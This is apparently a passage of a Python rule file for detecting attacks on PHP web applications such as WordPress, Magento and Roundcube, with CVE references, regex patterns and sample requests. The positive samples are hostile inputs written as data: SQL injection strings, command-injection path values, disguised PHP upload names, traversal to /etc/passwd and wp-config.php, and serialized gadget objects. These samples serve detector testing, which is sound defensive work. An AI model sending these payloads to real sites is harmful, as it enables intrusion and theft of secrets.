        "pos": [R("POST", "/backend/backend/auth/reset/1/x", ctype=FORM, body="code[]=a&password=P&password_confirmation=P")],
        "neg": [R("POST", "/backend/backend/auth/reset/1/abc", ctype=FORM, body="code=abcdef123&password=P&password_confirmation=P"),
                R(uri="/backend/backend/auth/reset/1/abc123")],
    },
    {
        "id": "octobercms-reset-code-json", "cve": "CVE-2021-32648",
        "target": {"type": "composer", "package": "october/system"},
        "description": "October CMS: the same reset bypass with the code sent as a JSON true, number or array.",
        "refs": ["https://github.com/octobercms/october/security/advisories/GHSA-mxr5-mc97-63rc",
                 "https://nvd.nist.gov/vuln/detail/CVE-2021-32648"],
        "path": r"/backend/backend/auth/reset",
        "all": [{"in": "body", "re": r"\"code\"\s*:\s*(?:true|\[|\{|[0-9])"}],
        "pos": [R("POST", "/backend/backend/auth/reset/1/x", ctype=JSON, body='{"code":true,"password":"P"}')],
        "neg": [R("POST", "/backend/backend/auth/reset/1/x", ctype=JSON, body='{"code":"abcdef123","password":"P"}')],
    },
    {
        "id": "roundcube-timezone-file-plant", "cve": "CVE-2017-16651",
        "target": {"type": "composer", "package": "roundcube/roundcubemail"},
        "description": "Roundcube: _timezone sent as a nested array at login plants a fake attachment "
                       "record (a server path) in the session; a real _timezone is always a string.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2017-16651",
                 "https://gist.github.com/thomascube/3ace32074e23fca0e6510e500bd914a1"],
        "all": [{"in": "param_name", "re": r"^_timezone\["}],
        "pos": [R("POST", "/?_task=login", ctype=FORM,
                  body="_task=login&_action=login&_user=u&_pass=p&_timezone%5Bfiles%5D%5B1%5D%5Bpath%5D=%2Fetc%2Fpasswd")],
        "neg": [R("POST", "/?_task=login", ctype=FORM, body="_task=login&_action=login&_user=u&_pass=p&_timezone=Europe%2FBerlin&_url="),
                R("POST", "/?_task=login", ctype=FORM, body="_task=login&_action=login&_user=u&_pass=p&_timezone=auto")],
    },
    {
        "id": "roundcube-timezone-file-read", "cve": "CVE-2017-16651",
        "target": {"type": "composer", "package": "roundcube/roundcubemail"},
        "description": "Roundcube: reading back the planted record through upload-display with _from=timezone, "
                       "which no real form uses.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2017-16651",
                 "https://gist.github.com/thomascube/3ace32074e23fca0e6510e500bd914a1"],
        "all": [{"in": "param", "name": "_action", "re": r"^upload-display$"},
                {"in": "param", "name": "_from", "re": r"^timezone$"}],
        "pos": [R(uri="/?_task=settings&_action=upload-display&_from=timezone&_file=rcmfile1")],
        "neg": [R(uri="/?_task=settings&_action=upload-display&_from=edit-identity&_file=rcmfile123abc"),
                R(uri="/?_task=settings&_action=upload-display&_from=response&_file=rcmfile9")],
    },
    {
        "id": "roundcube-installer-im-path", "cve": "CVE-2020-12641",
        "target": {"type": "composer", "package": "roundcube/roundcubemail"},
        "description": "Roundcube installer left reachable: shell metacharacters in the im_convert_path / "
                       "im_identify_path settings are later run by exec().",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2020-12641"],
        "path": r"/installer(?:/|/index\.php)?$",
        "all": [{"in": "param", "name": "*", "re": r"^/[^\s]*[;|`&<>$]|\$\("},
                {"in": "param_name", "re": r"^_im_(?:convert|identify)_path$"}],
        "pos": [R("POST", "/installer/index.php?_step=2", ctype=FORM, body="_im_convert_path=%2Fusr%2Fbin%2Fconvert%3Bid%3B&_im_identify_path="),
                R("POST", "/installer/?_step=2", ctype=FORM, body="_im_identify_path=%2Fusr%2Fbin%2Fidentify%60id%60")],
        "neg": [R("POST", "/installer/index.php?_step=2", ctype=FORM, body="_im_convert_path=%2Fusr%2Fbin%2Fconvert&_im_identify_path=%2Fusr%2Fbin%2Fidentify"),
                R(uri="/installer/index.php?_step=3")],
    },
    {
        "id": "cf7-upload-php-separator", "cve": "CVE-2020-35489",
        "target": {"type": "wp-plugin", "slug": "contact-form-7"},
        "description": "Contact Form 7 before 5.3.2: an upload named like x.php<space or control char>.jpg "
                       "slips past the filename check and can be saved as executable PHP.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2020-35489", "https://contactform7.com/2020/12/17/contact-form-7-532/",
                 "https://www.wordfence.com/blog/2020/12/a-challenging-exploit-the-contact-form-7-file-upload-vulnerability/"],
        "all": [{"in": "file_name", "re": r"\.(?:php\d?|phtml|phar|pht|phps)[\x00-\x20\x7f]"}],
        "pos": [R("POST", "/wp-json/contact-form-7/v1/contact-forms/123/feedback", body="_wpcf7=123&your-name=a",
                  files=[("file-1", "shell.php\t.jpg")]),
                R("POST", "/?rest_route=/contact-form-7/v1/contact-forms/123/feedback", files=[("upload", "a.phtml .png")])],
        "neg": [R("POST", "/wp-json/contact-form-7/v1/contact-forms/123/feedback", files=[("file-1", "report.pdf")]),
                R("POST", "/wp-json/contact-form-7/v1/contact-forms/123/feedback", files=[("file-1", "My CV 2024.docx")]),
                R("POST", "/wp-json/contact-form-7/v1/contact-forms/123/feedback", files=[("file-1", "php notes.txt")]),
                R("POST", "/wp-json/contact-form-7/v1/contact-forms/123/feedback", ctype=FORM, body="your-name=a&your-email=a%40b.c")],
    },
    {
        "id": "wp-core-pagename-traversal", "cve": "CVE-2026-87902",
        "target": {"type": "wp-core"},
        "description": "WordPress core page-template resolution decodes pagename a second time without "
                       "validate_file(), so an encoded ../ reaches a local .php include.",
        "refs": ["https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-7hp8-65ch-5whp",
                 "https://nvd.nist.gov/vuln/detail/CVE-2026-87902",
                 "https://safe.security/resources/blog/cve-2026-87902-wordpress-unauthenticated-path-traversal-leading-to-conditional-rce/"],
        "all": [{"in": "param", "name": "pagename", "re": r"%(?:25)*(?:2e|2f|5c|00)|\.\."}],
        "pos": [R(uri="/?page_id=2&pagename=%252e%252e%252f%252e%252e%252fusr%252flocal%252flib%252fphp%252fpearcmd"),
                R(uri="/index.php?page_id=2&pagename=page-x%2f%2e%2e%2f%2e%2e%2fwp-config"),
                R("POST", "/index.php", ctype=FORM, body="page_id=2&pagename=%252e%252e%252fx")],
        "neg": [R(uri="/?pagename=about-us"), R(uri="/?pagename=services/web-design&page_id=12"),
                R(uri="/?pagename=%E6%97%A5%E6%9C%AC"), R(uri="/?page_id=2")],
    },
    {
        "id": "wp-core-author-not-in-sqli", "cve": "CVE-2026-60137",
        "target": {"type": "wp-core"},
        "description": "WordPress core WP_Query: a string author__not_in is put into SQL unescaped; the "
                       "parameter only ever carries numeric author IDs.",
        "refs": ["https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf",
                 "https://www.patchstack.com/articles/unauthenticated-sql-injection-in-wordpress-core-fixed-in-7-0-2/"],
        "all": [{"in": "param", "name": "author__not_in", "re": r"[^0-9,\s]"}],
        "pos": [R(uri="/?author__not_in=1)%20OR%201=1--%20-")],
        "neg": [R(uri="/?author__not_in=1,2"), R(uri="/?s=hello")],
    },
    {
        "id": "wp-core-author-exclude-sqli", "cve": "CVE-2026-60137",
        "target": {"type": "wp-core"},
        "description": "WordPress core REST: author_exclude (mapped to author__not_in) with anything but numeric IDs.",
        "refs": ["https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf",
                 "https://www.patchstack.com/articles/unauthenticated-sql-injection-in-wordpress-core-fixed-in-7-0-2/"],
        "all": [{"in": "param", "name": "author_exclude", "re": r"[^0-9,\s]"}],
        "pos": [R(uri="/wp-json/wp/v2/posts?author_exclude=1)%20UNION%20SELECT%201--")],
        "neg": [R(uri="/wp-json/wp/v2/posts?author_exclude=3"), R(uri="/wp-json/wp/v2/posts?author_exclude[]=3&author_exclude[]=4")],
    },
    {
        "id": "wp-core-batch-unparseable-path", "cve": "CVE-2026-63030",
        "target": {"type": "wp-core"},
        "description": "WordPress core REST batch (wp2shell): a sub-request whose path has no route (\"http://:\") "
                       "shifts validation onto the wrong handler for every later sub-request.",
        "refs": ["https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q",
                 "https://rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core"],
        "path": r"/wp-json/batch/v1/?$",
        "all": [{"in": "body", "re": r'"requests"\s*:'}, {"in": "body", "re": r'"path"\s*:\s*"(?:https?:)?(?:\\?/){0,3}(?::[^"]*)?"'}],
        "pos": [R("POST", "/wp-json/batch/v1", ctype=JSON,
                  body='{"validation":"normal","requests":[{"method":"POST","path":"http://:"},{"method":"POST","path":"/batch/v1","body":{}}]}')],
        "neg": [R("POST", "/wp-json/batch/v1", ctype=JSON,
                  body='{"requests":[{"method":"POST","path":"/wp/v2/posts/12","body":{"title":"x"}},{"method":"DELETE","path":"/wp/v2/media/5"}]}'),
                R("POST", "/wp-json/batch/v1", ctype=JSON, body='{"validation":"require-all-validate","requests":[{"method":"PUT","path":"\\/wp\\/v2\\/settings","body":{}}]}')],
    },
    {
        "id": "wp-core-batch-nested", "cve": "CVE-2026-63030",
        "target": {"type": "wp-core"},
        "description": "WordPress core REST batch (wp2shell): a nested batch/v1 sub-request, or author_exclude "
                       "smuggled through a batch to reach the CVE-2026-60137 SQL injection.",
        "refs": ["https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q",
                 "https://connect.securonix.com/threat-research-intelligence-62/one-missing-array-element-inside-wp2shell-the-pre-auth-rce-in-wordpress-core-446"],
        "path": r"/wp-json/batch/v1/?$",
        "all": [{"in": "body", "re": r'"requests"\s*:'}, {"in": "body", "re": r'"path"\s*:\s*"[^"]*(?:batch\\?/v1|author_exclude|author__not_in)'}],
        "pos": [R("POST", "/wp-json/batch/v1", ctype=JSON, body='{"requests":[{"method":"POST","path":"/batch/v1","body":{"requests":[]}}]}'),
                R("POST", "/wp-json/batch/v1", ctype=JSON, body='{"requests":[{"method":"GET","path":"\\/wp\\/v2\\/posts?author_exclude=1)--"}]}')],
        "neg": [R("POST", "/wp-json/batch/v1", ctype=JSON, body='{"requests":[{"method":"POST","path":"/wp/v2/posts/12","body":{"title":"batch of cookies"}}]}')],
    },
    {
        "id": "wp-core-batch-unparseable-path-rest-route", "cve": "CVE-2026-63030",
        "target": {"type": "wp-core"},
        "description": "WordPress core REST batch (wp2shell): a sub-request whose path has no route (\"http://:\") "
                       "shifts validation onto the wrong handler for every later sub-request.",
        "refs": ["https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q",
                 "https://rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core"],
        "all": [{"in": "param", "name": "rest_route", "re": r"^/?batch/v1/?$"}, {"in": "body", "re": r'"requests"\s*:'}, {"in": "body", "re": r'"path"\s*:\s*"(?:https?:)?(?:\\?/){0,3}(?::[^"]*)?"'}],
        "pos": [R("POST", "/?rest_route=/batch/v1", ctype=JSON,
                  body='{"validation":"normal","requests":[{"method":"POST","path":"http://:"},{"method":"POST","path":"/batch/v1","body":{}}]}')],
        "neg": [R("POST", "/?rest_route=/batch/v1", ctype=JSON,
                  body='{"requests":[{"method":"POST","path":"/wp/v2/posts/12","body":{"title":"x"}},{"method":"DELETE","path":"/wp/v2/media/5"}]}'),
                R("POST", "/?rest_route=/batch/v1", ctype=JSON, body='{"validation":"require-all-validate","requests":[{"method":"PUT","path":"\\/wp\\/v2\\/settings","body":{}}]}')],
    },
    {
        "id": "wp-core-batch-nested-rest-route", "cve": "CVE-2026-63030",
        "target": {"type": "wp-core"},
        "description": "WordPress core REST batch (wp2shell): a nested batch/v1 sub-request, or author_exclude "
                       "smuggled through a batch to reach the CVE-2026-60137 SQL injection.",
        "refs": ["https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q",
                 "https://connect.securonix.com/threat-research-intelligence-62/one-missing-array-element-inside-wp2shell-the-pre-auth-rce-in-wordpress-core-446"],
        "all": [{"in": "param", "name": "rest_route", "re": r"^/?batch/v1/?$"}, {"in": "body", "re": r'"requests"\s*:'}, {"in": "body", "re": r'"path"\s*:\s*"[^"]*(?:batch\\?/v1|author_exclude|author__not_in)'}],
        "pos": [R("POST", "/?rest_route=/batch/v1", ctype=JSON, body='{"requests":[{"method":"POST","path":"/batch/v1","body":{"requests":[]}}]}'),
                R("POST", "/?rest_route=/batch/v1", ctype=JSON, body='{"requests":[{"method":"GET","path":"\\/wp\\/v2\\/posts?author_exclude=1)--"}]}')],
        "neg": [R("POST", "/?rest_route=/batch/v1", ctype=JSON, body='{"requests":[{"method":"POST","path":"/wp/v2/posts/12","body":{"title":"batch of cookies"}}]}')],
    },
    {
        "id": "magento-sessionreaper-session-config", "cve": "CVE-2025-54236",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce (SessionReaper): nested REST input reaches a session object, so "
                       "sessionConfig/savePath in the JSON points PHP at a planted session file.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2025-54236",
                 "https://experienceleague.adobe.com/en/docs/experience-cloud-kcs/kbarticles/ka-27397",
                 "https://www.sonicwall.com/blog/nested-deserialization-to-rce-in-adobe-commerce-magento-cve-2025-54236-"],
        "path": r"^/(?:index\.php/)?rest/",
        "all": [{"in": "body", "re": r"\"(?:sessionConfig|savePath|save_path|urlBuilder)\"\s*:"}],
        "pos": [R("PUT", "/rest/default/V1/guest-carts/ab12cd/order", ctype=JSON, cookies={"PHPSESSID": "0123456789abcdef0123456789abcdef"},
                  body='{"paymentMethod":{"paymentData":{"context":{"urlBuilder":{"session":{"sessionConfig":{"savePath":"media/customer_address/s/e"}}}}}}}'),
                R("PUT", "/rest/V1/carts/mine/order", ctype=JSON, body='{"paymentMethod":{"paymentData":{"context":{"urlBuilder":{}}}}}')],
        "neg": [R("PUT", "/rest/default/V1/guest-carts/ab12cd/order", ctype=JSON, body='{"paymentMethod":{"method":"checkmo"}}'),
                R("POST", "/rest/default/V1/guest-carts/ab12cd/payment-information", ctype=JSON,
                  body='{"email":"a@b.com","paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"x"}},"billingAddress":{"street":["1 Main"],"city":"X","postcode":"12345","countryId":"US"}}'),
                R(uri="/rest/default/V1/guest-carts/ab12cd/totals")],
    },
    {
        "id": "magento-sessionreaper-session-upload", "cve": "CVE-2025-54236",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce (SessionReaper): planting the session file through the customer "
                       "address file upload, named like a PHP session file (sess_...).",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2025-54236",
                 "https://www.sonicwall.com/blog/nested-deserialization-to-rce-in-adobe-commerce-magento-cve-2025-54236-"],
        "path": r"/customer/address_file/upload",
        "all": [{"in": "file_name", "re": r"^sess_"}],
        "pos": [R("POST", "/customer/address_file/upload", body="form_key=abc",
                  files=[("custom_attributes[country_id]", "sess_0123456789abcdef0123456789abcdef")])],
        "neg": [R("POST", "/customer/address_file/upload", files=[("custom_attributes[proof]", "invoice.pdf")]),
                R("POST", "/customer/address_file/upload", files=[("custom_attributes[doc]", "photo.jpg")])],
    },
    {
        "id": "magento-polyshell-cart-file-info", "cve": "CVE-2026-48356",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce (PolyShell): a cart item's custom option file_info is checked only for "
                       "an image MIME type, so a file named .php is written under pub/media.",
        "refs": ["https://www.adobe.com/trust/security/products/commerce/apsb26-73.html",
                 "https://nvd.nist.gov/vuln/detail/CVE-2026-48356",
                 "https://slcyber.io/research-center/magento-polyshell-unauthenticated-file-upload-to-rce-in-magento-apsb25-94/"],
        "path": r"^/(?:index\.php/)?rest/[^/]+/V1/(?:guest-carts|carts)/[^/]+/items",
        "all": [{"in": "body", "re": r"\"file_info\"\s*:"},
                {"in": "body", "re": r"\"name\"\s*:\s*\"[^\"]*\.(?:php[0-9s]?|phtml|phar|pht|pgif|shtml|htaccess|inc|cgi|pl|py|sh)\s*\""}],
        "pos": [R("POST", "/rest/default/V1/guest-carts/abc123/items", ctype=JSON,
                  body='{"cart_item":{"qty":1,"sku":"x","product_option":{"extension_attributes":{"custom_options":[{"option_id":"1","option_value":"file","extension_attributes":{"file_info":{"base64_encoded_data":"R0lGODlh","name":"k3j9x0qz1a.php","type":"image/png"}}}]}}}}'),
                R("POST", "/rest/default/V1/guest-carts/abc123/items", ctype=JSON,
                  body='{"cart_item":{"product_option":{"extension_attributes":{"custom_options":[{"extension_attributes":{"file_info":{"name":"a.phtml","type":"image/gif"}}}]}}}}')],
        "neg": [R("POST", "/rest/default/V1/guest-carts/abc123/items", ctype=JSON, body='{"cartItem":{"sku":"24-MB01","qty":1,"quote_id":"abc123"}}'),
                R("POST", "/rest/default/V1/guest-carts/abc123/items", ctype=JSON,
                  body='{"cart_item":{"product_option":{"extension_attributes":{"custom_options":[{"extension_attributes":{"file_info":{"name":"logo.png","type":"image/png"}}}]}}}}'),
                R("PUT", "/rest/default/V1/guest-carts/abc123/items/5", ctype=JSON, body='{"cartItem":{"qty":2}}')],
    },
    {
        "id": "magento-stylesmuggler-graphql-styles", "cve": "CVE-2026-75650",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce (StyleSmuggler): template style gadget parameters (styles[...], "
                       "template_styles) on the GraphQL endpoint, which takes no such parameters.",
        "refs": ["https://www.adobe.com/trust/security/products/commerce/apsb26-146.html",
                 "https://sansec.io/research/stylesmuggler-0day", "https://www.fastly.com/blog/what-is-style-smuggler-cve-2026-75650"],
        "path": r"^/(?:index\.php/)?graphql",
        "all": [{"in": "query", "re": r"(?:^|&)(?:styles(?:\[|%5b)|template_styles)"}],
        "pos": [R("POST", "/graphql?styles%5Bfirst%5D=..%2Fvar%2Freport%2Fx&styles%5BgeneratorClass%5D=a&text=%7B%7Bblock%20class%3D%22x%22%7D%7D&type=2"),
                R("POST", "/graphql?template_styles=1&styles[first]=../var/log/system.log")],
        "neg": [R("POST", "/graphql", ctype=JSON, body='{"query":"{ storeConfig { store_code } }"}'),
                R(uri="/graphql?query=%7Bproducts(search%3A%22shirt%22)%7Btotal_count%7D%7D")],
    },
    {
        "id": "magento-stylesmuggler-block-directive", "cve": "CVE-2026-75650",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce (StyleSmuggler): a {{block class=...}} template directive in the text "
                       "parameter sent to GraphQL.",
        "refs": ["https://sansec.io/research/stylesmuggler-0day", "https://www.fastly.com/blog/what-is-style-smuggler-cve-2026-75650"],
        "path": r"^/(?:index\.php/)?graphql",
        "all": [{"in": "param", "name": "text", "re": r"\{\{\s*block\s+class\s*="}],
        "pos": [R("POST", "/graphql?text=%7B%7Bblock%20class%3D%22Magento%5CFramework%5CDataObject%22%7D%7D&type=2")],
        "neg": [R("POST", "/graphql?text=hello"), R(uri="/graphql?query=%7Bcms%7D&text=block")],
    },
    {
        "id": "magento-stylesmuggler-store-header", "cve": "CVE-2026-75650",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce (StyleSmuggler): PHP source in the GraphQL Store header, written to a "
                       "log file that the gadget later includes.",
        "refs": ["https://sansec.io/research/stylesmuggler-0day"],
        "path": r"^/(?:index\.php/)?graphql",
        "all": [{"in": "header", "name": "Store", "re": r"<\?"}],
        "pos": [R("POST", "/graphql", headers={"Store": "<?php echo 1;?>"}, ctype=JSON, body='{"query":"{ storeConfig { store_code } }"}')],
        "neg": [R("POST", "/graphql", headers={"Store": "default"}), R("POST", "/graphql", headers={"Store": "en_us"})],
    },
    {
        "id": "magento-stylesmuggler-paypal-query", "cve": "CVE-2026-75650",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce (StyleSmuggler): a PHP open tag in the PayPal transparent response "
                       "query, logged and later included.",
        "refs": ["https://sansec.io/research/stylesmuggler-0day"],
        "path": r"^/(?:index\.php/)?paypal/transparent/response",
        "all": [{"in": "query", "re": r"(?:<|%3c)(?:\?|%3f)"}],
        "pos": [R("POST", "/paypal/transparent/response/?%3C%3F%3D1%3B")],
        "neg": [R("POST", "/paypal/transparent/response/", ctype=FORM, body="RESULT=0&PNREF=A1B2&SECURETOKEN=x"),
                R("POST", "/paypal/transparent/response/?form_key=abc")],
    },
    # ------------------------------------------------------------------ generic
    {
        "id": "generic-php-stream-wrapper-in-param", "cve": None,
        "target": {"type": "generic"},
        "description": "A request value that is a PHP stream wrapper (php://input, php://filter, expect://, phar://, "
                       "zip://, data:// with base64): almost never legitimate, common in file-inclusion attempts.",
        "refs": ["https://www.php.net/manual/en/wrappers.php"],
        "all": [{"in": "param", "name": "*", "re": r"^\s*(?:php://(?:input|filter|fd|memory|temp)|expect://|phar://|zip://|compress\.zlib://|data://[a-z/+-]*;base64)"}],
        "pos": [R(uri="/index.php?page=php://filter/convert.base64-encode/resource=index"),
                R("POST", "/x.php", body="file=phar%3A%2F%2Fuploads%2Fa.jpg", ctype=FORM)],
        "neg": [R(uri="/docs?q=what+is+php%3A%2F%2Finput"), R(uri="/?img=data:image/png;base64,iVBOR")],
    },
    {
        "id": "generic-ini-directive-in-query", "cve": None,
        "target": {"type": "generic"},
        "description": "php.ini directives being assigned in the query string (auto_prepend_file=, allow_url_include=).",
        "refs": ["https://www.php.net/manual/en/ini.core.php"],
        "all": [{"in": "query", "re": r"(?:auto(?:_|%5f)(?:prepend|append)(?:_|%5f)file|allow(?:_|%5f)url(?:_|%5f)include)\s*(?:=|%3d)"}],
        "pos": [R(uri="/index.php?-d+allow_url_include%3D1")],
        "neg": [R(uri="/?s=auto_prepend_file"), R(uri="/blog/why-allow_url_include-is-dangerous/")],
    },
    {
        "id": "generic-serialized-object-gadget", "cve": None,
        "target": {"type": "generic", "requires_gadget": True},
        "description": "A PHP serialized object (O:<len>:\"Class\") in a cookie, parameter or body, on a site that "
                       "has a package with a known deserialization gadget chain installed.",
        "refs": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"],
        "all": [{"in": "any", "re": r"(?:^|[;{}:\x22])[oc]:\d{1,4}:\x22[a-z_\\][a-z0-9_\\]{2,200}\x22:\d{1,4}:\{"}],
        "pos": [R(uri="/", cookies={"prefs": 'O:24:"GuzzleHttp\\Psr7\\FnStream":2:{s:33:"\x00GuzzleHttp\\Psr7\\FnStream\x00methods";a:0:{}}'}),
                R("POST", "/cart", body='data=a%3A1%3A%7Bi%3A0%3BO%3A18%3A%22Monolog%5CHandler%5CX%22%3A0%3A%7B%7D%7D', ctype=FORM)],
        "neg": [R(uri="/", cookies={"cart": "a:1:{i:0;s:3:\"abc\";}"}), R(uri="/?q=O%3A24+hours")],
    },
    {
        "id": "generic-traversal-to-secrets", "cve": None,
        "target": {"type": "generic"},
        "description": "Directory traversal toward wp-config.php, .env or /etc/passwd in a request value or the path.",
        "refs": ["https://owasp.org/www-community/attacks/Path_Traversal"],
        "all": [{"in": "any_or_path", "re": r"(?:\.\.|%2e%2e)(?:/|\\|%2f|%5c).{0,200}(?:wp-config\.php|\.env\b|etc/passwd|etc%2fpasswd)"}],
        "pos": [R(uri="/download.php?f=../../wp-config.php"), R(uri="/index.php?page=..%2f..%2f..%2fetc%2fpasswd")],
        "neg": [R(uri="/docs/../guide/env-vars.html"), R(uri="/?q=how+to+edit+wp-config.php")],
    },
]

# Composer packages with public deserialization gadget chains (PHPGGC families).
GADGET_PACKAGES = {
    "monolog/monolog", "guzzlehttp/guzzle", "laravel/framework", "symfony/process", "symfony/cache",
    "doctrine/annotations", "doctrine/common", "phpunit/phpunit", "swiftmailer/swiftmailer",
    "laminas/laminas-log", "zendframework/zend-log", "yiisoft/yii2", "drupal/core", "magento/framework",
    "wordpress/wordpress", "phpseclib/phpseclib", "slim/slim", "codeigniter4/framework",
}
